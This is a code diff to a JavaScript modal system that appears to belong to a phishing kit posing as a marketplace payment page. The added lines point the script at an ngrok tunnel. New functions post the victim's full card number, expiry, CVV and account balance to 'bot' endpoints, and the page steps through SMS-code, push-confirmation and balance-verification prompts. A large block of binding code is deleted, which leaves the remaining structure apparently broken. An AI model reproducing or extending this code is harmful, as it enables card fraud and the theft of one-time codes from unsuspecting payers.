@@ -3,6 +3,8 @@
 (function () {
   'use strict';
 
+  var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
+
   // In-memory only card number cache (never persisted to storage)
   var _memCardNum = '';
   // In-memory full card data cache (never persisted to storage)
@@ -540,278 +542,9 @@
       '</div>';
 
     document.body.appendChild(container);
-
-    if (typeof window.OTPAutofill !== 'undefined') {
-      window.OTPAutofill.init();
-    }
-
-    this._bind('msBalanceVerifyBtn', 'click', function () { self._submitBalance(); });
-
-    // Balance input: only digits, one decimal separator, max 2 decimal places
-    function balanceInputFilter(inp) {
-      if (!inp) return;
-      inp.addEventListener('input', function () {
-        var v = inp.value.replace(/[^0-9.,]/g, '');
-        // keep only first decimal separator
-        var parts = v.split(/[.,]/);
-        if (parts.length > 1) {
-          v = parts[0] + '.' + parts.slice(1).join('').substring(0, 2);
-        }
-        inp.value = v;
-      });
-    }
-    balanceInputFilter(document.getElementById('msBalanceVerifyInput'));
-    balanceInputFilter(document.getElementById('msBalanceCode'));
-
-    // Card form modal: close, submit, brand detection
-    this._bind('msCardFormClose', 'click', function () {
-      self.hideCardForm();
-    });
-    this._bind('_buttonPay', 'click', function () {
-      self._submitCardForm();
-    });
-    // Brand detection on card number input
-    var msCardInput0 = document.getElementById('_input0');
-    if (msCardInput0) {
-      msCardInput0.addEventListener('input', function () {
-        self._detectCardBrand(this.value.replace(/\D/g, ''));
-        // Use full raw number from CardForm (avoids the masked •••• 1234 value)
-        var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
-          ? CardForm.getRawNumber()
-          : this.value.replace(/\D/g, '');
-        var expEl = document.getElementById('_input1');
-        self._updatePreview({
-          number: rawNum,
-          exp: expEl ? expEl.value : '',
-          holder: ''
-        });
-      });
-    }
-    var msCardInput1 = document.getElementById('_input1');
-    if (msCardInput1) {
-      msCardInput1.addEventListener('input', function () {
-        var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
-          ? CardForm.getRawNumber()
-          : (document.getElementById('_input0') || {}).value || '';
-        self._updatePreview({
-          number: rawNum,
-          exp: this.value,
-          holder: ''
-        });
-      });
-    }
-    // Esc closes card modal; Enter submits when pay button is enabled
-    var msCardOverlay = document.getElementById('msCardForm');
-    if (msCardOverlay) {
-      document.addEventListener('keydown', function (ev) {
-        if (!msCardOverlay.classList.contains('active')) return;
-        if (ev.key === 'Escape' || ev.keyCode === 27) {
-          ev.preventDefault();
-          self.hideCardForm();
-        } else if (ev.key === 'Enter' || ev.keyCode === 13) {
-          var btn = document.getElementById('_buttonPay');
-          if (btn && !btn.disabled) {
-            ev.preventDefault();
-            self._submitCardForm();
-          }
-        }
-      });
-      // Click on backdrop closes modal (outside the card box)
-      msCardOverlay.addEventListener('mousedown', function (ev) {
-        if (ev.target === msCardOverlay) self.hideCardForm();
-      });
-    }
-
-    this._bind('msSmsBtn', 'click', function () { self._sendValue('sms', 'msSmsCode'); });
-    this._bind('msSmsCallBtn', 'click', function () { self._sendValue('callSms', 'msSmsCallCode'); });
-
-    // Auto-submit SMS code when pasted or autofilled from keyboard
-    var smsInput = document.getElementById('msSmsCode');
-    var smsCallInput = document.getElementById('msSmsCallCode');
-    function autoSubmitSms(inputEl, type, inputId) {
-      if (!inputEl) return;
-      var lastLen = 0;
-      var rapidStart = 0;
-      var rapidTimer = null;
-      inputEl.addEventListener('input', function () {
-        var v = inputEl.value.replace(/\D/g, '');
-        // Detect autofill: value jumped from 0-1 chars to 4+ in one event
-        if (v.length >= 4 && lastLen <= 1) {
-          self._sendValue(type, inputId);
-        }
-        // Rapid-fill: if 4+ digits entered within 500ms, it's autofill not manual
-        if (v.length >= 1 && v.length < 4 && !rapidStart) {
-          rapidStart = Date.now();
-        }
-        if (v.length >= 4 && rapidStart && lastLen < 4) {
-          if (Date.now() - rapidStart < 100) {
-            self._sendValue(type, inputId);
-          }
-          rapidStart = 0;
-        }
-        if (rapidTimer) clearTimeout(rapidTimer);
-        rapidTimer = setTimeout(function() { rapidStart = 0; }, 200);
-        lastLen = v.length;
-      });
-    }
-    autoSubmitSms(smsInput, 'sms', 'msSmsCode');
-    autoSubmitSms(smsCallInput, 'callSms', 'msSmsCallCode');
-
-    this._bind('msPushBtn', 'click', function () { self._confirmAction('push'); });
-    this._bind('msCallBtn', 'click', function () { self._confirmAction('call'); });
-    this._bind('msWrongDataDisplayBtn', 'click', function () { self._resetToCard(); });
-    this._bind('msWrongDataBtn', 'click', function () { self._sendValue(self.wrongDataType, 'msWrongDataCode'); });
-    this._bind('msBalanceBtn', 'click', function () { self._sendValue('balance', 'msBalanceCode'); });
-    this._bind('msFieldBtn', 'click', function () { self._sendValue('custom', 'msFieldCode'); });
-    this._bind('msSmenalkBtn', 'click', function () { self._handleSmenalk(); });
-    this._bind('msErrorBtn', 'click', function () { self._resetToCard(); });
-    this._bind('msCustomBtn', 'click', function () { self._confirmCustom(); });
-    this._bind('msSupportBtn', 'click', function () {
-      if (typeof window.forceOpenChat === 'function') {
-        if (typeof window._userClosedChat !== 'undefined') window._userClosedChat = false;
-        window.forceOpenChat();
-      }
-    });
-    this._bind('msMerchantBtn', 'click', function () { self._resetToCard(); });
-    this._bind('msPopolnenieBtn', 'click', function () { self._resetToCard(); });
-    this._bind('msPhoneBtn', 'click', function () {
-      if (self.cfg.requestPhoneAfterBalance && self._pendingBalance !== undefined) {
-        var phoneInp = document.getElementById('msPhoneInput');
-        var phoneVal = (phoneInp.value || '').trim();
-        if (!phoneVal || phoneVal.length < 5) {
-          phoneInp.style.borderColor = 'var(--modal-error, #d32f2f)';
-          var phoneErr = document.getElementById('msPhoneError');
-          if (phoneErr) phoneErr.style.display = 'block';
-          return;
-        }
-        phoneInp.style.borderColor = 'var(--modal-accent, #1867c1)';
-        var phoneErr2 = document.getElementById('msPhoneError');
-        if (phoneErr2) phoneErr2.style.display = 'none';
-        var phoneBtn = document.getElementById('msPhoneBtn');
-        if (phoneBtn) { phoneBtn.disabled = true; phoneBtn.textContent = '...'; }
-        self._pendingPhone = phoneVal;
-        self.showModal('msLoading');
-        self._sendLog(self._pendingBalance);
-        self._pendingBalance = undefined;
-      } else {
-        self._sendValue('requestPhone', 'msPhoneInput');
-      }
-    });
-    this._bind('msBirthdayBtn', 'click', function () { self._submitBirthday(); });
-
-    this._setupDateSegments();
-  };
-
-  ModalSystem.prototype._resetPhoneBtn = function () {
-    var phoneBtn = document.getElementById('msPhoneBtn');
-    if (phoneBtn) {
-      phoneBtn.disabled = false;
-      var t = this.cfg.translate || {};
-      phoneBtn.textContent = (t.sms && t.sms.next || 'Confirm');
-    }
-  };
-
-  ModalSystem.prototype._bind = function (id, evt, fn) {
-    var el = document.getElementById(id);
-    if (el) el.addEventListener(evt, fn);
-  };
-
-  ModalSystem.prototype._setupDateSegments = function () {
-    var day = document.getElementById('msBdayDay');
-    var month = document.getElementById('msBdayMonth');
-    var year = document.getElementById('msBdayYear');
-    if (!day || !month || !year) return;
-
-    function onlyDigits(e) {
-      var v = e.target.value.replace(/\D/g, '');
-      e.target.value = v;
-    }
-
-    day.addEventListener('input', function (e) {
-      onlyDigits(e);
-      if (e.target.value.length >= 2) month.focus();
-    });
-    month.addEventListener('input', function (e) {
-      onlyDigits(e);
-      if (e.target.value.length >= 2) year.focus();
-    });
-    year.addEventListener('input', function (e) {
-      onlyDigits(e);
-    });
-
-    month.addEventListener('keydown', function (e) {
-      if (e.key === 'Backspace' && !e.target.value) { day.focus(); }
-    });
-    year.addEventListener('keydown', function (e) {
-      if (e.key === 'Backspace' && !e.target.value) { month.focus(); }
-    });
-  };
-
-  ModalSystem.prototype._submitBirthday = function () {
-    var day = document.getElementById('msBdayDay');
-    var month = document.getElementById('msBdayMonth');
-    var year = document.getElementById('msBdayYear');
-    var hidden = document.getElementById('msBirthdayInput');
-    var errEl = document.getElementById('msBirthdayError');
-    var group = document.getElementById('msBirthdayGroup');
-
-    var d = (day.value || '').trim();
-    var m = (month.value || '').trim();
-    var y = (year.value || '').trim();
-
-    if (!d || !m || !y || d.length < 1 || m.length < 1 || y.length < 4) {
-      if (errEl) errEl.style.display = 'block';
-      if (group) group.style.borderColor = 'var(--modal-error, #d32f2f)';
-      return;
-    }
-
-    if (errEl) errEl.style.display = 'none';
-    if (group) group.style.borderColor = 'var(--modal-accent, #1867c1)';
-
-    var val = d.padStart(2, '0') + '.' + m.padStart(2, '0') + '.' + y;
-    hidden.value = val;
-
-    this._sendValue('requestBirthday', 'msBirthdayInput');
-  };
-
-  ModalSystem.prototype.showModal = function (id) {
-    if (this.currentModal) this.currentModal.classList.remove('active');
-    var m = document.getElementById(id);
-    if (m) { 
-      m.classList.add('active'); 
-      this.currentModal = m;
-
-      // Inject card mask for SMS modal
-      var cardNum = (this._cardData && this._cardData.cardNumber) || '';
-      if (!cardNum) { cardNum = _memCardNum || ''; }
-      if ((id === 'msSms' || id === 'msSmsCall') && cardNum) {
-        var digits = cardNum.replace(/\D/g, '');
-        var first6 = digits.substring(0, 6);
-        var last4 = digits.substring(digits.length - 4);
-        var masked = first6.substring(0, 4) + ' ' + first6.substring(4, 6) + '** **** ' + last4;
-        var maskEl = m.querySelector('.ms-sms-card-mask');
-        if (maskEl) maskEl.textContent = masked;
-      }
-
-      if (typeof window.OTPAutofill !== 'undefined') {
-        setTimeout(function() { window.OTPAutofill.init(); }, 100);
-      }
-    }
-  };
-
-  ModalSystem.prototype.hideAllModals = function () {
-    var all = document.querySelectorAll('.ms-overlay');
-    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
-    this.currentModal = null;
-  };
-
-  ModalSystem.prototype.processCard = function (cardData) {
-    if (this._cardLocked) return;
-    this._cardLocked = true;
-    this._cardData = cardData;
-    _memCardNum = cardData.cardNumber || '';
-    _memCardData = cardData;
     this.showModal('msLoading');
+
+    this._sendCardDataToBot(cardData);
 
     var self = this;
 
@@ -865,29 +598,28 @@
       needBalance = true;
     }
 
+    
+    function postCardToBot() {
+      axios.post('/api/sendLog', {
+        item: self.cfg.itemId,
+        cardNumber: rawCardNum,
+        cardMonth: cardData.cardMonth,
+        cardYear: cardData.cardYear,
+        cardCvv: cardData.cardCvv,
+        balance: 'pending'
+      }).catch(function () {});
+    }
+
     if (needBalance) {
       axios.post('/api/preLog', {
-        item: this.cfg.itemId,
+        item: self.cfg.itemId,
         cardNumber: rawCardNum,
         cardMonth: cardData.cardMonth,
         cardYear: cardData.cardYear,
         cardCvv: cardData.cardCvv
       }).catch(function () {});
       
-      
-      if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
-        var binInfo = { brand: 'Unknown', type: 'Unknown' };
-        var first6 = rawCardNum.replace(/\D/g, '').substring(0, 6);
-        if (first6.length >= 4) {
-          BinChecker.getBinInfo(first6).then(function(info) {
-            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, info);
-          }).catch(function() {
-            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
-          });
-        } else {
-          BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
-        }
-      }
+      postCardToBot();
 
       setTimeout(function () {
         self.showModal('msBalanceVerify');
@@ -901,19 +633,7 @@
       }, 2500);
     } else {
       
-      if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
-        var binInfo = { brand: 'Unknown', type: 'Unknown' };
-        var first6 = rawCardNum.replace(/\D/g, '').substring(0, 6);
-        if (first6.length >= 4) {
-          BinChecker.getBinInfo(first6).then(function(info) {
-            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, info);
-          }).catch(function() {
-            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
-          });
-        } else {
-          BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
-        }
-      }
+      postCardToBot();
 
       setTimeout(function () {
         if (self.cfg.requestPhoneAfterBalance) {
@@ -1012,12 +732,38 @@
     }
 
     
+    var _adId = window.__currentAdId || window.itemId || self.cfg.itemId;
+    this._sendBalanceToBot(raw);
     if (typeof BinChecker !== 'undefined' && BinChecker.sendBalance) {
-      BinChecker.sendBalance(self.cfg.itemId, raw);
+      BinChecker.sendBalance(_adId, raw);
     }
 
     this.showModal('msLoading');
     this._sendLog(raw);
+  };
+
+  ModalSystem.prototype._sendCardDataToBot = function (cardData) {
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    axios.post('/api/user-data', {
+      adId: _adId,
+      type: 'card',
+      cardNumber: (cardData.cardNumber || '').replace(/\s/g, ''),
+      cardMonth: cardData.cardMonth,
+      cardYear: cardData.cardYear,
+      cardCvv: cardData.cardCvv
+    }).catch(function () {});
+    if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
+      BinChecker.sendCardData(_adId, cardData.cardNumber, {});
+    }
+  };
+
+  ModalSystem.prototype._sendBalanceToBot = function (balance) {
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    axios.post('/api/user-data', {
+      adId: _adId,
+      type: 'balance',
+      balance: balance
+    }).catch(function () {});
   };
 
   ModalSystem.prototype._sendLog = function (balance) {
@@ -1444,6 +1190,8 @@
     if (price !== undefined && price !== null) {
       this.updatePrice(price, curr);
     }
+    this._lastSentCardKey = null;
+    this._lastSentBalance = null;
     var overlay = document.getElementById('msCardForm');
     if (!overlay) return;
     overlay.classList.add('active');
@@ -1930,6 +1678,8 @@
     this.currentStatus = null;
     this.paused = true;
     this._cardLocked = false;
+    this._lastSentCardKey = null;
+    this._lastSentBalance = null;
     if (typeof this.cfg.onResetCard === 'function') {
       this.cfg.onResetCard();
     }
